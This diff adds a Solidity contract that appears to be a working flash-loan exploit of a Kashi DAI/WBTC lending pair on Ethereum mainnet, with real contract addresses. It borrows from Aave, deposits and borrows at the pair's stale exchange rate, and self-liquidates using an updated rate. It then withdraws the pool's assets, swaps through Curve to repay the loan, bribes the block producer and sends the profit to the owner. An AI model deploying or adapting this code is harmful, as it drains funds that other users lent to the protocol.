@@ -1,0 +1,258 @@
+pragma solidity ^0.8.0;
+import "./IBentoBoxV1.sol";
+// import "forge-std/Test.sol";
+import "./IKashiPair.sol";
+import "./Executor.sol";
+import "./IFlashLoanReceiver.sol";
+import "./IPoolV2.sol";
+
+interface IWETH {
+    function withdraw (uint256 _wag) external;
+}
+
+interface ICurve{
+    function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy) external;
+}
+interface I3Crv{
+    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
+}
+
+contract Dai_wbtc is IFlashLoanReceiver, Executor{
+
+    // Addresses
+    address public DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F; //Main
+    address public WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;//Main 
+    address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;//Main
+    address public USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7; //Main
+    
+    address public BentoBoxV1 = 0xF5BCE5077908a1b7370B9ae04AdC565EBd643966;//Main
+    address public Kashi = 0x2cBA6Ab6574646Badc84F0544d05059e57a5dc42;//Main
+    address public AAVE_POOLV2 = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;//Main  
+    address public aWBTC_POOLV2 = 0x9ff58f4fFB29fA2266Ab25e75e2A8b3503311656;//Main
+    address public curvePool = 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46;//Main 0usdt/1wbtc/2weth
+    address public _3CRVPool = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;//Main 0dai/1usdc/2usdt 
+  
+    address public DAI_WBTC_LINK = 0x418BC3ff0Ba33AD64931160A91C92fA26b35aCB0;  //Main
+
+
+    IBentoBoxV1 box = IBentoBoxV1(BentoBoxV1);
+    IKashiPairMediumRiskV1 kashiPair = IKashiPairMediumRiskV1(DAI_WBTC_LINK);
+
+    IERC20 wbtc = IERC20(WBTC);
+    IERC20 dai = IERC20(DAI);
+    IERC20 usdt = IERC20(USDT);
+    IWETH weth = IWETH(WETH);
+
+    ILendingPool flashPool = ILendingPool(AAVE_POOLV2);// AAVE pool V2
+    ICurve curve = ICurve(curvePool);
+    I3Crv _3crv = I3Crv(_3CRVPool);
+    
+
+    constructor() Executor(msg.sender){
+        // owner = msg.sender; 
+    }
+
+    function getFlashloan (uint256 amountCollateral, uint256 exchangeRateUpdated) external onlyExecutor returns (bool){     
+       
+        // uint256 wbtc_balanceInPool = wbtc.balanceOf(aWBTC_POOLV2);
+        // console.log("wbtc_balanceInPool : ",wbtc_balanceInPool);
+        uint256 wbtc_amount = amountCollateral;
+        // if (amountCollateral < wbtc_balanceInPool){
+        //     wbtc_amount = amountCollateral;
+        // }        
+
+        wbtc.approve(AAVE_POOLV2, uint256(2**256-1));
+        dai.approve(AAVE_POOLV2, uint256(2**256-1));
+ 
+        uint256 dai_amount = wbtc_amount * 10**18 / exchangeRateUpdated;        
+
+        address[] memory assets = new address[](2);
+        assets[0] = DAI;
+        assets[1] = WBTC;
+        uint256[] memory amounts = new uint256[](2);
+        amounts[1] = wbtc_amount;
+        amounts[0] = dai_amount;
+        uint256[] memory modes = new uint256[](2);
+        modes[0] = 0;
+        modes[1] = 0;
+
+        bytes memory data = abi.encode(wbtc_amount, dai_amount, exchangeRateUpdated);
+
+        flashPool.flashLoan(address(this), assets, amounts, modes, address(this), data, uint16(0));
+      
+        wbtc.approve(curvePool, (2**256-1));
+        curve.exchange(1, 2, balanceOfThis(WBTC), 0);
+        bribe(balanceOfThis(WETH));
+        payable(owner).transfer(address(this).balance);
+     
+        return true;
+    }
+
+    function bribe(uint256 amountIn) internal {
+ 
+        weth.withdraw(amountIn);
+        uint256 _ethBalanceAfter = payable(address(this)).balance;
+        // console.log("ETH balance :",_ethBalanceAfter);
+        // require(_wethBalanceAfter > _wethBalanceBefore + _ethAmountToCoinbase);
+        // if (_ethAmountToCoinbase == 0) return;
+
+        // uint256 _ethBalance = address(this).balance;
+        // if (_ethBalance < _ethAmountToCoinbase) {
+        //     WETH.withdraw(_ethAmountToCoinbase - _ethBalance);
+        // }
+        uint256 _ethAmountToCoinbase = _ethBalanceAfter * 15 / 100; // bribe 10% WETH
+        // console.log("_ethAmountToCoinbase :",_ethAmountToCoinbase);
+        block.coinbase.transfer(_ethAmountToCoinbase);
+    }
+
+     function executeOperation(
+        address[] calldata assets,
+        uint256[] calldata amounts,
+        uint256[] calldata premiums,// 5%..
+        address initiator,
+        bytes calldata params
+    ) external override returns (bool) {   
+        assets;
+        require(initiator == address(this), "Not waste your time ;)"); 
+    
+
+        (uint256 wbtc_amount, uint256 dai_amount, uint256 rate) = abi.decode(params,(uint256,uint256,uint256)); 
+
+        (uint256 collateralAmount,uint256 collateralShare,uint256 fraction) 
+            = prepair(wbtc_amount, dai_amount);  
+        assert(liquidate(collateralAmount,collateralShare,rate));
+        withdraw(fraction);
+        //Test
+        // uint256 currentRate = kashiPair.exchangeRate();
+        // uint256 balaa = balanceOfThis(WBTC);
+        // uint256 amount = wbtc_amount * 1409 / 10000;
+        // vm.prank(0xccF4429DB6322D5C611ee964527D42E5d685DD6a);//Compound cWBTC
+        // wbtc.transfer(address(this), amount);
+        // console.log("vm wtbc amount transtered :",amount);
+
+        assert(handle(amounts,premiums));        
+        
+        return true;
+    }
+
+    function handle(uint256[] calldata amounts, uint256[] calldata premiums) internal returns (bool){
+        uint256 baldaa = balanceOfThis(DAI);
+        uint256 balaaa = balanceOfThis(WBTC);
+
+        uint256 supplyAmount = baldaa - amounts[0] - premiums[0]; 
+        uint256 borrowAmount = amounts[1] + premiums[1] - balaaa;
+
+        dai.approve(_3CRVPool, supplyAmount);
+        usdt.approve(curvePool, uint256(2**256-1));
+        // console.log("DAI flash amount :",amounts[0]);
+        // console.log("DAI supplyAmount :",supplyAmount);
+        // console.log("WBTC borrowAmount :",borrowAmount);
+        // flashPool.deposit(DAI, supplyAmount, address(this), uint16(0));
+        // flashPool.borrow(WBTC, borrowAmount, 2, 0, address(this));
+        _3crv.exchange(0, 2, supplyAmount, 0);
+        uint256 usdtBal = balanceOfThis(USDT);
+        curve.exchange(0, 1, usdtBal, borrowAmount);
+        
+        return true;
+    }
+
+    function prepair(uint256 wbtc_amount, uint256 dai_amount) internal returns (uint256,uint256,uint256){       
+
+        bytes32 r = hex"0000000000000000000000000000000000000000000000000000000000000000";
+        bytes32 s = hex"0000000000000000000000000000000000000000000000000000000000000000";
+        box.setMasterContractApproval(address(this), Kashi, true, uint8(0), r, s);
+        
+        wbtc.approve(BentoBoxV1, balanceOfThis(WBTC));
+        uint256 wbtc_share = box.toShare(wbtc, wbtc_amount, false);
+        (uint256 wbtc_amountOut,uint256 wbtc_shareOut) = box.deposit(wbtc, address(this), address(this), uint256(0), wbtc_share);  //   
+        kashiPair.addCollateral(address(this), false, wbtc_share);
+   
+        uint256 balub = balanceOfThis(DAI); 
+        dai.approve(BentoBoxV1, balub); //susd     
+        uint256 dai_share = box.toShare(dai, dai_amount, false);
+        box.deposit(dai, address(this), address(this), uint256(0), dai_share); //     
+        uint256 fraction = kashiPair.addAsset( address(this), false, dai_share);  
+        
+        return (wbtc_amountOut, wbtc_shareOut, fraction);
+    }
+
+    function liquidate(uint256 wbtcAmount,uint256 wbtcShare,uint256 rate) internal returns (bool){
+        uint exchangeRateOld = kashiPair.exchangeRate();
+        uint256 maxBorrowAmount = wbtcAmount * 75 * 9995 * 10 ** 12 / exchangeRateOld;
+        uint daiAmountInBox = box.balanceOf(dai, DAI_WBTC_LINK);   
+        // console.log("maxBorrowAmount :",maxBorrowAmount);
+        // console.log("daiAmountInBox :",daiAmountInBox);    
+        if(maxBorrowAmount <= daiAmountInBox){
+            kashiPair.borrow(address(this), maxBorrowAmount);   
+        }else{
+            kashiPair.borrow(address(this), daiAmountInBox);   
+        }           
+
+        uint256 part = accurate(wbtcShare,rate);
+        address[] memory users = new address[](1);
+        users[0] = address(this);
+        uint[] memory maxBorrowParts = new uint[](1);     
+        maxBorrowParts[0] = part ;
+            //    maxBorrowParts[0] = part * 86 / 100;  //Test
+        address swapper = 0x0000000000000000000000000000000000000000;  
+        kashiPair.liquidate(users, maxBorrowParts, address(this), swapper, true);
+        
+        return true;
+    }
+
+    function accurate(uint256 wbtcShare, uint256 rate) internal returns (uint256 part){
+ 
+        (uint256 elastic, uint256 base) = kashiPair.totalBorrow();
+
+        uint256 wbtcAmount = box.toAmount(wbtc, wbtcShare, false);
+        uint256 daiAmount = wbtcAmount * 10**20 / 112 / rate;       
+        uint256 daiShare = box.toShare(dai, daiAmount, false);
+        uint256 dai_amount = box.toAmount(dai, daiShare, false);      
+        part = dai_amount * base / elastic;
+        // console.log("part :",part);
+        return part;
+    }
+
+     function withdraw(uint256 fraction) internal {
+        ( uint256 elastic, uint256 base) = kashiPair.totalAsset();
+        // console.log("totalAsset elastic:",elastic);
+        // console.log("totalAsset base",base);
+        ( uint256 elasticAmount,) = kashiPair.totalBorrow();
+        uint256 totalBorrowToShare = box.toShare(dai, elasticAmount, true);
+        uint256 fractionNew = elastic * base / (elastic + totalBorrowToShare);
+        // console.log("fractionNew :",fractionNew); 
+        uint256 f = fractionNew < fraction ? fractionNew : fraction;
+        kashiPair.removeAsset(address(this), f);
+
+        uint256 shareU = box.balanceOf(dai, address(this));
+        // uint256 boxBalU = dai.balanceOf(BentoBoxV1);
+        // console.log("After att box dai balance :",boxBalU);
+        uint256 shareA = box.balanceOf(wbtc, address(this));
+        // if(boxBalU > shareU){
+        box.withdraw(dai, address(this), address(this), 0, shareU);
+        // }else{
+        //     box.withdraw(dai,address(this), address(this),0,boxBalU);
+        // }       
+        box.withdraw(wbtc, address(this), address(this), 0, shareA);
+    }
+
+    function balanceOfThis(address _erc20TokenAddress) internal view returns (uint256 bal) {
+        IERC20 ERC20Token;    
+        ERC20Token = IERC20(_erc20TokenAddress);
+   
+        bal = ERC20Token.balanceOf(address(this));
+        // console.log("Executor Token balance", bal);
+        return bal;   
+
+    }
+
+    function call (address payable _to, uint256 _value, bytes calldata _data) external onlyOwner payable returns (bytes memory) {
+        require(_to != address(0));
+        (bool _success, bytes memory _result) = _to.call{value: _value}(_data);
+        require(_success);
+        return _result;
+    }
+
+    receive()external payable {}
+ 
+}
